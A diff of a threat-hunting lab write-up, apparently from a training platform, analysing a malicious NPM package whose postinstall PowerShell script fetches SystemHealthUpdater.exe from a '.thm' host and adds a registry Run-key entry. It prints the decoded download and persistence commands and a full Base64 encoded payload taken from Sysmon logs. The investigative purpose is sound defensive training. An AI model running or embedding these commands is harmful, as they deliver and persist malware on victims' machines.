@@ -105,19 +105,21 @@ The company operates with a small creative team, collaborative tools, and a high
 
 <br>
 
+<h3>Timeline</h3>
+
 <h4>Stage 1 of 3</h4>
 
 <p>  
 
-- Title: Initial Access<br>
-- Adversary step descrirption: Initial Access was gained at Jul 21st 2025 10:58:27 by installing  "healthchk-lib@1.0.1" NPM package. Next "postintall.ps1" was downloaded and installed through PowerShell employing the following syntax to cover the related actions "-NoP -W Hidden -EncodedCommand".  "postinstall.ps1" execute automotically and was downloaded from global-update.windows.thm.<br>
+- Title: <code>Initial Access</code><br>
+- Adversary step description: Initial Access was gained at Jul 21st 2025 10:58:27 by installing  "healthchk-lib@1.0.1" NPM package. Next "postintall.ps1" was downloaded and installed through PowerShell employing the following syntax to cover the related actions "-NoP -W Hidden -EncodedCommand".  "postinstall.ps1" execute automotically and was downloaded from global-update.windows.thm.<br>
 - Timestamp: Jul 21st 2025 10:58:27<br>
-- Tactic: Initial Acces<br>
+- Tactic: Initial Access<br>
 - Technique: Supply Chain Compromise<br>
-- User: tom@pawpress.me<br>
-- Asset: paw-tom<br>
+- User: <code>tom@pawpress.me</code><br>
+- Asset: <code>paw-tom</code>br>
 - List of IOCs:<br>
-   --- Host = pwa-tom
+   --- Host = <code>paw-tom</code>
    --- Current Directory = C:\Development\node_modules\healthchk-lib\<br>
    --- Process ID = 5880<br>
    --- Image = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe<br>
@@ -132,13 +134,291 @@ The company operates with a small creative team, collaborative tools, and a high
 |  sort by +_time
 ```
 
-<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/ae24ab3d-a36b-4b24-b6de-33b71433c964"><br>
-                  <img width="1200px" src="https://github.com/user-attachments/assets/85017168-5759-4541-9d99-ce42cd57a03b"><br>
-                    <img width="1200px" src="https://github.com/user-attachments/assets/fa05d3c5-4a84-46d8-a093-6077bfbe20cf"><br>
+
+<img width="1898" height="880" alt="image" src="https://github.com/user-attachments/assets/f5ea681a-fb2a-4084-9604-af3d34cbd5f6" />
+
+<img width="1902" height="879" alt="image" src="https://github.com/user-attachments/assets/adbbb87c-9120-4f19-9f16-0dc7a9f78c98" />
+
+<img width="1897" height="469" alt="image" src="https://github.com/user-attachments/assets/9a7fbc9b-ebf1-4229-9a77-f89b57502b43" />
+
+
+
+
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/557360e1-2958-4afe-a130-72cb3fb4d8c0"><br>
+                  <img width="1200px" src="https://github.com/user-attachments/assets/149ae7e3-156c-4d27-b4f4-c7dd7af2b539"><br>
                   <img width="1200px" src="https://github.com/user-attachments/assets/c03e7479-1977-4590-acba-965af0f48a2c"><br>
-                  <img width="250px" src="https://github.com/user-attachments/assets/0639c45a-2532-48af-89c4-2776c1c8080b"></p>
+                  <img width="400px" src="https://github.com/user-attachments/assets/0639c45a-2532-48af-89c4-2776c1c8080b"></p>
 
 
+<img width="280" height="149" alt="image" src="https://github.com/user-attachments/assets/b4593096-c30c-494c-83a3-99f109791efe" />
+
+
+
+<br>
+
+
+<h4>Stage 2 of 3</h4>
+
+<p>  
+
+- Title: Malicious Script Execution Post NPM package Installation<br>
+- Adversary step description: After installing the compromised NPM package, the postinstall.ps1 script executed automatically running a hidden PowerShell script encoded. This script downloaded the executable SystemHealthUpdater.ex eto APPDATA using command Invoke-WebRequest.<br>
+- Timestamp: Jul 21st 2025 10:58:27<br>
+- Tactic: Execution<br>
+- Technique: Command and Scripting Interpreter<br>
+- User: tom@pawpress.me<br>
+- Asset: paw-tom<br>
+- List of IOCs:<br>
+Decoding the Command Line identified:<br>
+---  Destination: $env:APPDATA\SystemHealthUpdater.exe<br>
+--- URL:  http://global-update.wlndows.thm/SystemHealthUpdater.exe<br>
+--- Command to Download the File:  Invoke-WebRequest -Uri $url -OutFile $dest<br>
+---  Command to Encode:  $encoded = [Convert]::ToBase64String(
+    [Text.Encoding]::Unicode.GetBytes("Start-Process '$dest'")
+)<br>
+--- Command to Build Persistance: $runCmd = 'powershell.exe -NoP -W Hidden -EncodedCommand ' + $encoded<br>
+--- Command to register persistance:  Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
+    -Name 'Windows Update Monitor' -Value $runCmd<br>
+</p>
+
+```bash
+* node
+| table _time category subject host ComputerName Account_Domain Account_Name  EventCode OriginalFileName CommandLine ParentCommandLine Image ParentImage Hashes
+|  sort by +_time
+```
+
+
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/557360e1-2958-4afe-a130-72cb3fb4d8c0"><br>
+                  <img width="400px" src="https://github.com/user-attachments/assets/db9d4ccc-3a1a-4c60-aeeb-231c48b0a028"></p>
+
+<img width="292" height="149" alt="image" src="https://github.com/user-attachments/assets/3b2cfe16-d3ff-4280-900d-ef0bef4d162f" />
+
+
+
+
+<br>
+
+The malicious actor established persistsnece by modifying the user registry key 'HKCU\Software\Microsoft\Windows\CurrntVersion\Rn'.  A new valune was created to execute a hidden PowerShell command = 'Windows Update Monitor'. This command encoded in Base64 and downloaded the payload again and again. 'SystemHealthUpdated.exe' guaranteed the execution.
+
+<h4>Stage 3 of 3</h4>
+
+<p>  
+
+- Title: Persistence Registry<br>
+- Adversary step descrirption:Persistence was established by modifying user´s registry key The NPM package ran a hidder PowerShell script using  Ba64 encoding and leading to download and executable file to %APPDATA%.<br>
+- Timestamp: Jul 21st 2025 10:59:04<br>
+- Tactic: Execution<br>
+- Technique: Scheduled Task/Job<br>
+- User: tom@pawpress.me<br>
+- Asset: paw-tom<br>
+- List of IOCs:<br>
+ComputerName=paw-tom
+ProcessId: 1924
+Image: C:\Program Files\nodejs\node.exe
+FileVersion: 22.16.0
+Description: Node.js JavaScript Runtime
+Product: Node.js
+Company: Node.js
+OriginalFileName: node.exe
+CommandLine: "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-prefix.js"
+CurrentDirectory: C:\Development\
+User: PAW-TOM\itadmin-tom
+ParentProcessId: 4668
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" ParentUser: PAW-TOM\itadmin-tom
+    -Name 'Windows Update Monitor' -Value $runCmd<br>
+</p>
+
+
+
+
+https://github.com/user-attachments/assets/8e16fc80-4362-4403-9265-367f455d59f7
                   
+https://github.com/user-attachments/assets/edc01325-518e-46fa-84d0-54d3e1f968a1
+
+<img width="1900" height="830" alt="image" src="https://github.com/user-attachments/assets/ebd4d11c-3a19-4924-88d0-e12511c4208a" />
+
+
+<img width="282" height="149" alt="image" src="https://github.com/user-attachments/assets/b20764d7-d989-48af-85dc-086685eddb3c" />
+
+
+
+
+<img width="1656" height="233" alt="image" src="https://github.com/user-attachments/assets/71ce1b23-9a6f-4218-8888-2b81003fd963" />
+
+
+
+
+<br>
+
+<h3>Hypothesis = <code>Proven</code></h3>
+
+<br>
+
+<h3>Threat Report</h3>
+
+
+<p>Threat Case Report: Supply Chain Compromise
+Executive Summary
+Initial Access
+Description: The adversary gained initial access by installing a compromised NPM package, healthchk-lib@1.0.1, which included a postinstall.ps1 script. This script executed automatically using a PowerShell command encoded in Base64, downloading a malicious file from global-update.windows.thm.
+Tactic & Technique: Initial Access (TA0001), Supply Chain Compromise (T1195)
+User & Asset: tom@pawpress.me, paw-tom
+Timestamp: Mon Jul 21 2025 11:58:27 GMT+0100 (British Summer Time)
+Malicious Script Execution
+Description: The postinstall.ps1 script executed a hidden PowerShell command to download SystemHealthUpdater.exe into the APPDATA directory using Invoke-WebRequest.
+Tactic & Technique: Execution (TA0002), Command and Scripting Interpreter (T1059)
+User & Asset: tom@pawpress.me, paw-tom
+Timestamp: Mon Jul 21 2025 11:58:27 GMT+0100 (British Summer Time)
+Registry-Based Persistence
+Description: Persistence was established by modifying the registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run to include a new entry for a PowerShell command, ensuring SystemHealthUpdater.exe would execute repeatedly.
+Tactic & Technique: Persistence (TA0003), Boot or Logon Autostart Execution (T1547)
+User & Asset: tom@pawpress.me, paw-tom
+Timestamp: Mon Jul 21 2025 11:59:04 GMT+0100 (British Summer Time)
+Impact and Findings
+The attack leveraged a supply chain compromise to gain access and execute malicious scripts, ultimately achieving persistence via registry modifications. This method ensures continuous payload execution, posing a significant threat to system integrity and security.
+
+For further analysis and incident response, please refer to the detailed logs and SIEM links provided in each stage's description..</p>
+
+
+<img width="1152" height="574" alt="image" src="https://github.com/user-attachments/assets/b0f4c8ce-eefc-453e-86ba-3f99f70500a4" />
+
+<img width="1125" height="822" alt="image" src="https://github.com/user-attachments/assets/6bd01d1e-741e-44c6-886f-850027d59ccf" />
+
+
+Indicators of compromise [IOCs] detected
+The following is a breakdown of all IOCs, detected and undetected.
+
+Host based
+NPM Package
+Stage 1
+PowerShell Command
+Stage 2
+Decoded Command
+Stage 2
+Registry Path
+Stage 3
+Registry Value Name
+Stage 3
+
+
+
+
+
+
+The malicious actor gained initilal access by installing a NPM package healthchk-lib@1.0.1, installing and downloading postinstall.ps1 script. which run automatically hidden in PowerShell through "NoP -W Hidden -EncodedCommand". postinstall.ps1 execute a malicious file from an external source: global-update.windows.thm.
+
+Initial Access
+
+T1195
+
+tom@pawpress.me
+
+paw-tom
+
+CommandLine: powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABTAHkAcwB0AGUAbQBIAGUAYQBsAHQAaABVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAJAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZwBsAG8AYgBhAGwALQB1AHAAZABhAHQAZQAuAHcAbABuAGQAbwB3AHMALgB0AGgAbQAvAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoAFUAcABkAGEAdABlAHIALgBlAHgAZQAiAA0ACgANAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGYAaQBsAGUADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AA0ACgANAAoAIwAgAEIAYQBzAGUANgA0ACAAZQBuAGMAbwBkAGUAIAB0AGgAZQAgAGMAbwBtAG0AYQBuAGQADQAKACQAZQBuAGMAbwBkAGUAZAAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgADQAKACAAIAAgACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAiAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnACQAZABlAHMAdAAnACIAKQANAAoAKQANAAoADQAKACMAIABCAHUAaQBsAGQAIABwAGUAcgBzAGkAcwB0AGUAbgBjAGUAIABjAG8AbQBtAGEAbgBkAA0ACgAkAHIAdQBuAEMAbQBkACAAPQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAnACAAKwAgACQAZQBuAGMAbwBkAGUAZAANAAoADQAKACMAIABBAGQAZAAgAHQAbwAgAHIAZQBnAGkAcwB0AHIAeQAgAGYAbwByACAAcABlAHIAcwBpAHMAdABlAG4AYwBlAA0ACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAnACAAYAANAAoAIAAgACAAIAAtAE4AYQBtAGUAIAAnAFcAaQBuAGQAbwB3AHMAIABVAHAAZABhAHQAZQAgAE0AbwBuAGkAdABvAHIAJwAgAC0AVgBhAGwAdQBlACAAJAByAHUAbgBDAG0AZAA=
+Company: Microsoft Corporation
+ComputerName: paw-tom
+CurrentDirectory: C:\Development\node_modules\healthchk-lib\
+Description: Windows PowerShell
+OriginalFileName: PowerShell.EXE
+ParentCommandLine: C:\Windows\system32\cmd.exe /d /s /c powershell.exe -NoP -W Hidden -EncodedCommand JABkAGUAcwB0ACAAPQAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABTAHkAcwB0AGUAbQBIAGUAYQBsAHQAaABVAHAAZABhAHQAZQByAC4AZQB4AGUAIgANAAoAJAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZwBsAG8AYgBhAGwALQB1AHAAZABhAHQAZQAuAHcAbABuAGQAbwB3AHMALgB0AGgAbQAvAFMAeQBzAHQAZQBtAEgAZQBhAGwAdABoAFUAcABkAGEAdABlAHIALgBlAHgAZQAiAA0ACgANAAoAIwAgAEQAbwB3AG4AbABvAGEAZAAgAGYAaQBsAGUADQAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABkAGUAcwB0AA0ACgANAAoAIwAgAEIAYQBzAGUANgA0ACAAZQBuAGMAbwBkAGUAIAB0AGgAZQAgAGMAbwBtAG0AYQBuAGQADQAKACQAZQBuAGMAbwBkAGUAZAAgAD0AIABbAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgADQAKACAAIAAgACAAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAiAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnACQAZABlAHMAdAAnACIAKQANAAoAKQANAAoADQAKACMAIABCAHUAaQBsAGQAIABwAGUAcgBzAGkAcwB0AGUAbgBjAGUAIABjAG8AbQBtAGEAbgBkAA0ACgAkAHIAdQBuAEMAbQBkACAAPQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAnACAAKwAgACQAZQBuAGMAbwBkAGUAZAANAAoADQAKACMAIABBAGQAZAAgAHQAbwAgAHIAZQBnAGkAcwB0AHIAeQAgAGYAbwByACAAcABlAHIAcwBpAHMAdABlAG4AYwBlAA0ACgBTAGUAdAAtAEkAdABlAG0AUAByAG8AcABlAHIAdAB5ACAALQBQAGEAdABoACAAJwBIAEsAQwBVADoAXABTAG8AZgB0AHcAYQByAGUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAnACAAYAANAAoAIAAgACAAIAAtAE4AYQBtAGUAIAAnAFcAaQBuAGQAbwB3AHMAIABVAHAAZABhAHQAZQAgAE0AbwBuAGkAdABvAHIAJwAgAC0AVgBhAGwAdQBlACAAJAByAHUAbgBDAG0AZAA=
+ParentImage: C:\Windows\System32\cmd.exe
+ParentProcessId: 1616
+ParentUser: PAW-TOM\itadmin-tom
+ProcessGuid: {c5d2b969-9053-6856-e701-000000002a01}
+ProcessId: 5880
+Product: Microsoft® Windows® Operating System
+RecordNumber: 43451
+
+
+
+
+
+
+After installing the compromised NPM package, the postinstall.ps1 script executed automatically running a hidden PowerShell script encoded. This script downloaded the executable SystemHealthUpdater.ex eto APPDATA using command Invoke-WebRequest.
+
+Incorrect
+Description analysis
+POWERED BY AI
+
+
+Execution
+
+T1059
+
+Your report provides a clear overview of the incident involving the installation of a compromised NPM package, leading to the execution of a hidden PowerShell script. However, it lacks specific details on how the PowerShell script was executed in relation to the NPM process. It's important to mention the relationship between the execution of PowerShell and the npm process, specifically noting if PowerShell was executed as a child of the npm process through cmd.exe. Additionally, while you noted that the PowerShell script was encoded, it would be beneficial to specify that Base64 encoding was used, as this detail helps in understanding the evasion tactics employed by the adversary. Overall, your analysis is on the right track, but including these additional details would enhance its accuracy and depth.
+
+tom@pawpress.me
+
+paw-tom
+
+
+
+___
+
+Adversary step description:
+The malicious actor established persistsnece by modifying the user registry key 'HKCU\Software\Microsoft\Windows\CurrntVersion\Rn'. A new valune was created to execute a hidden PowerShell command = 'Windows Update Monitor'. This command encoded in Base64 and downloaded the payload again and again. 'SystemHealthUpdated.exe' guaranteed the execution.
+
+Incorrect
+Description analysis
+POWERED BY AI
+The report details a persistence mechanism used by the adversary, involving the modification of a registry key. However, there are some inaccuracies in the description. The key path mentioned contains a typographical error, which could lead to misunderstandings or misconfigurations during analysis. Additionally, the explanation of how the registry modification occurred lacks clarity, particularly regarding the role of the PowerShell script and the postinstall command. It's crucial to provide precise technical details to ensure accurate threat detection and response. Make sure to verify the registry key paths and the sequence of actions to improve the accuracy of your reports in the future.
+
+Tactic:
+Persistence
+
++20 points
+Technique:
+T1547
+
++20 points
+User (Optional):
+tom@pawpress.me
+
++10 points
+Asset:
+paw-tom
+
+List of IOCs:
+CommandLine: "C:\Program Files\nodejs\node.exe" "C:\Program Files\nodejs/node_modules/npm/bin/npm-cli.js" list
+Company: Node.js
+ComputerName: paw-tom
+CurrentDirectory: C:\Development\
+Description: Node.js JavaScript Runtime
+EventCode: 1
+EventType: 4
+FileVersion: 22.16.0
+Hashes: MD5=0E35FC3B0EC975B76843501524C2F269,SHA256=C5FF4C736112DD483C750FD4149D30C8A116DB1A49B8B3EC88BE4B65E6C86C19,IMPHASH=414BABB6B54E11CCDAA7AB6CEE795375
+Image: C:\Program Files\nodejs\node.exe
+IntegrityLevel: High
+Keywords: None
+LogName: Microsoft-Windows-Sysmon/Operational
+LogonGuid: {c5d2b969-8e55-6856-61d5-050000000000}
+LogonId: 0x5D561
+OpCode: Info
+OriginalFileName: node.exe
+ParentCommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessGuid: {c5d2b969-906a-6856-f201-000000002a01}
+ParentProcessId: 4668
+ParentUser: PAW-TOM\itadmin-tom
+ProcessGuid: {c5d2b969-9078-6856-f501-000000002a01}
+ProcessId: 464
+Product: Node.js
+RecordNumber: 43466
+RuleName: -
+Sid: S-1-5-18
+SidType: 0
+SourceName: Microsoft-Windows-Sysmon
+TaskCategory: Process Create (rule: ProcessCreate)
+TerminalSessionId: 2
+Type: Information
+
+
+
+
+
+
 
 
